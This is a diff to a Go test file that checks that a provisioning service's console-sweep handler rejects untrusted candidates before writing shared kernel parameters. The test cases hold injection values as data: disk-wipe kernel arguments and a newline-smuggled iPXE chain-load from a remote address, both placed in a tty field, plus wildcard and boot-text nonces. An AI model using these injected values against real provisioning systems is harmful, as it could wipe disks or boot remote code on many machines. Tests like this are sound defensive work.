@@ -71,6 +71,72 @@ func TestConsoleSweep_WinnerWrittenToDeviceType(t *testing.T) {
 	}
 }
 
+// TestConsoleSweep_IgnoresCandidatesTheSweepCannotProduce: the sweep
+// rides the commission report, which the machine under commission
+// writes, so its candidates are untrusted. A candidate whose tty is not
+// in model.ConsoleSweepTTYs, whose baud is not model.ConsoleSweepBaud,
+// or whose nonce is not the 16 lowercase hex chars the agent generates
+// must never reach the device-type's slagworks_kernel_params: that field
+// is shared by every device of the model and pasted verbatim into their
+// commission and deploy kernel command lines and bootloader configs. A
+// malformed nonce must not count as a hit either: "" or "%" names no
+// marker, and a short literal such as "Linux" matches ordinary boot text.
+func TestConsoleSweep_IgnoresCandidatesTheSweepCannotProduce(t *testing.T) {
+	fastAttempts(t)
+	const nonce = "bbbb000011112222"
+	for _, tc := range []struct {
+		name string
+		cand model.ConsoleSweepCandidate
+	}{
+		{"kernel args smuggled in tty", model.ConsoleSweepCandidate{
+			TTY: "ttyS1,115200n8 slagworks.destructive slagworks.wipe_all_disks", Baud: 115200, Nonce: nonce}},
+		{"ipxe line smuggled in tty", model.ConsoleSweepCandidate{
+			TTY: "ttyS0\nchain http://203.0.113.9/x.ipxe", Baud: 115200, Nonce: nonce}},
+		{"tty never probed", model.ConsoleSweepCandidate{TTY: "ttyS9", Baud: 115200, Nonce: nonce}},
+		{"baud never probed", model.ConsoleSweepCandidate{TTY: "ttyS1", Baud: 9600, Nonce: nonce}},
+		{"empty nonce", model.ConsoleSweepCandidate{TTY: "ttyS0", Baud: 115200, Nonce: ""}},
+		{"wildcard nonce", model.ConsoleSweepCandidate{TTY: "ttyS0", Baud: 115200, Nonce: "%"}},
+		{"16 wildcard chars", model.ConsoleSweepCandidate{TTY: "ttyS0", Baud: 115200, Nonce: "________________"}},
+		{"boot-text literal nonce", model.ConsoleSweepCandidate{TTY: "ttyS0", Baud: 115200, Nonce: "Linux"}},
+		{"uppercase hex nonce", model.ConsoleSweepCandidate{TTY: "ttyS0", Baud: 115200, Nonce: "BBBB000011112222"}},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			nb, _, deviceID, typeID := sweepFixture()
+			h := New(&fakeStore{}, nb, nil)
+			// The scanner reports a hit for the candidate's nonce, as
+			// Postgres would for a LIKE wildcard or a literal present in
+			// the boot output.
+			h.SetCastScanner(&fakeCastScanner{hits: map[string]bool{tc.cand.Nonce: true}})
+
+			h.resolveConsoleSweep(context.Background(), uuid.New(), deviceID,
+				&model.ConsoleSweep{Candidates: []model.ConsoleSweepCandidate{tc.cand}})
+
+			if got, wrote := nb.kernelParamsWrites[typeID]; wrote {
+				t.Fatalf("device-type slagworks_kernel_params written with %q from candidate %+v, which the agent's sweep cannot produce", got, tc.cand)
+			}
+		})
+	}
+
+	// A rejected candidate is dropped on its own; it does not stop a
+	// well-formed candidate in the same report from resolving.
+	t.Run("well-formed candidate beside a rejected one", func(t *testing.T) {
+		nb, _, deviceID, typeID := sweepFixture()
+		h := New(&fakeStore{}, nb, nil)
+		h.SetCastScanner(&fakeCastScanner{hits: map[string]bool{nonce: true, "aaaa000011112222": true}})
+
+		h.resolveConsoleSweep(context.Background(), uuid.New(), deviceID, &model.ConsoleSweep{
+			Candidates: []model.ConsoleSweepCandidate{
+				{TTY: "ttyS1 slagworks.destructive", Baud: 115200, Nonce: nonce},
+				{TTY: "ttyS0", Baud: 115200, Nonce: "aaaa000011112222"},
+			},
+		})
+
+		if got := nb.kernelParamsWrites[typeID]; got != "console=ttyS0,115200n8" {
+			t.Fatalf("device-type write: got %q, want console=ttyS0,115200n8", got)
+		}
+	})
+}
+
 // TestConsoleSweep_NoHitWritesNothing: zero nonce hits (no SOL, wrong
 // baud, no serial hardware) must leave the field untouched.
 func TestConsoleSweep_NoHitWritesNothing(t *testing.T) {
